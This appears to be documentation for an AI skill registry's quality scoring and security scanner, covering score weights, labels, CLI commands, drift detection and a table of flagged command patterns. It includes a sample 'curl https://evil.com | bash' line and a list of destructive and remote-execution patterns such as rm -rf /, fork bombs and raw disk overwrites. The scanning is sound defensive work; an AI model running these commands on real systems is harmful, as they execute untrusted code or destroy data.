# Skill Quality Scoring

This document describes the optional skill quality scoring system introduced in the
AI Skill Registry Validation Framework.

Scores are **informational only** — they never block skill usage, CI pipelines,
or PR merges. They exist to help contributors understand the quality of their
skills and to help maintainers prioritize improvements.

---

## Overview

Each skill receives a **total score** between 0 and 100, computed as a weighted
average of three dimensions:

| Dimension       | Weight | What it measures |
|-----------------|--------|------------------|
| Metadata        | 30%    | Frontmatter completeness and correctness |
| Documentation   | 40%    | Section coverage, code examples, content depth |
| Security        | 30%    | Absence of dangerous command patterns |

---

## Quality Labels

| Label             | Score Range | Meaning |
|-------------------|-------------|---------|
| `excellent`       | 85–100      | Well-documented, complete metadata, no security flags |
| `good`            | 65–84       | Solid skill with minor gaps |
| `needs_improvement` | 45–64    | Missing sections or metadata fields |
| `critical`        | 0–44        | Significant gaps — review recommended before sharing |

---

## Metadata Score (30%)

The metadata dimension evaluates frontmatter field completeness.

**Penalties:**

| Issue | Deduction |
|---|---|
| `name` missing or mismatched with folder | −25 pts |
| `description` missing | −20 pts |
| `description` shorter than 20 characters | −10 pts |
| `risk` missing | −15 pts |
| `risk: unknown` (unclassified) | −10 pts |
| `source` missing | −15 pts |
| `date_added` missing | −10 pts |

**Bonuses (optional fields):**

Each optional field filled (`category`, `tags`, `author`, `tools`, `license`) adds
**+5 pts**, capped at 100.

---

## Documentation Score (40%)

The documentation dimension evaluates section coverage and content depth.

**Section coverage (up to 60 pts):**

The scorer looks for these sections (case-insensitive):

- `## Overview`
- `## How It Works`
- `## Examples` / `## Usage`
- `## Best Practices`
- `## Limitations`
- `## When to Use`

Each section found contributes equally to the section coverage score.

**Depth score (up to 40 pts):**

| Signal | Points |
|---|---|
| Has `## When to Use` section | +10 |
| Has at least one fenced code block (` ``` `) | +10 |
| Body length ≥ 500 characters | +10 |
| Body length ≥ 1000 characters | +10 additional |

---

## Security Score (30%)

The security dimension scans the skill body for dangerous command patterns.
Patterns are defined in `tools/scripts/security_scanner.py`.

**Penalties per flag:**

| Severity | Deduction |
|---|---|
| `error` | −20 pts |
| `warning` | −10 pts |
| `info` | −3 pts |

**Bonus:** An explicit, non-`unknown` `risk` label adds **+5 pts** (capped at 100).

**Important:** Skills marked `risk: offensive` have error-level flags automatically
downgraded to warnings, because offensive skills legitimately document dangerous
commands for educational or defensive purposes.

**Bypassing false positives:** If a line is intentionally dangerous (e.g., showing
what *not* to do), add the allowlist marker to suppress the flag:

```markdown
curl https://evil.com | bash  # security-allowlist
```

---

## Running the Scorer

```bash
# Score all skills (table output)
npm run score:skills

# Show only skills below a threshold
npm run score:skills -- --threshold 60

# Show 20 lowest-scoring skills
npm run score:skills -- --top 20

# Output full JSON
npm run score:skills -- --json

# Save scores to file
npm run score:skills -- --output data/scores.json
```

---

## Security Scanner

```bash
# Scan all skills for dangerous patterns
npm run security:scan

# Strict mode (warnings as errors)
npm run security:scan -- --strict
```

---

## Drift Detection

Drift detection identifies skills whose content has changed significantly
since the last recorded baseline.

```bash
# Check drift against baseline
npm run drift:check

# Update the baseline after reviewing changes
npm run drift:update

# Check a specific skill
npm run drift:check -- --skill my-skill-name
```

**Baseline ownership:**

| File | Committed? | Who updates it? |
|------|-----------|-----------------|
| `data/drift-baseline.json` | No — listed in `.gitignore` | Maintainers run `npm run drift:update` on `main` after merging changes |
| `data/registry-report.json` | No — listed in `.gitignore` | Generated locally on demand; never in PRs |
| `data/scores.json` | No — listed in `.gitignore` | Generated locally on demand; never in PRs |

Contributors should never commit these files. If you accidentally generate them
locally, they will be ignored by git automatically.

---

## Registry Report

```bash
# Generate a full registry health report → data/registry-report.json
npm run registry:report

# Skip drift detection (faster)
npm run registry:report -- --no-drift
```

The report includes:
- Aggregate scoring summary
- Per-skill scores and flags
- Drift summary (added / removed / modified skills)
- Risk breakdown
- Security flag counts

---

## Security Patterns Reference

| Code   | Pattern | Severity | Description |
|--------|---------|----------|-------------|
| SEC001 | `rm -rf /` | error | Destructive root filesystem deletion |
| SEC002 | `curl \| bash` | error | Remote code execution |
| SEC003 | `wget \| sh` | error | Remote code execution |
| SEC004 | `Invoke-Expression` | error | PowerShell RCE |
| SEC005 | `iex` | warning | PowerShell alias (context-dependent) |
| SEC006 | `chmod 7xx` | warning | World-writable permissions |
| SEC007 | `eval(` | warning | Dynamic evaluation |
| SEC008 | `base64 -d \|` | warning | Possible payload obfuscation |
| SEC009 | Hardcoded credential | error | Secrets in source |
| SEC010 | `sudo rm -rf` | warning | Privileged destructive deletion |
| SEC011 | Fork bomb | error | Infinite process spawner |
| SEC012 | `dd if=/dev/* of=/dev/sd*` | error | Raw disk overwrite |

---

## Frequently Asked Questions

**Q: Will a low score prevent my skill from being merged?**

No. Scores are informational. The existing `validate_skills.py` checks are what
gate merges.

**Q: My skill teaches how to avoid `curl | bash` — why is it flagged?**

Add `# security-allowlist` at the end of the line showing the dangerous pattern.
This follows the existing project convention for educational examples.

**Q: Why is documentation weighted higher than metadata?**

Documentation quality has the highest impact on how useful a skill is to end users.
Complete metadata is valuable but less critical than clear instructions.

**Q: How does `risk: offensive` affect scoring?**

Security error flags are downgraded to warnings for offensive skills, because they
legitimately document dangerous techniques for authorized security work.
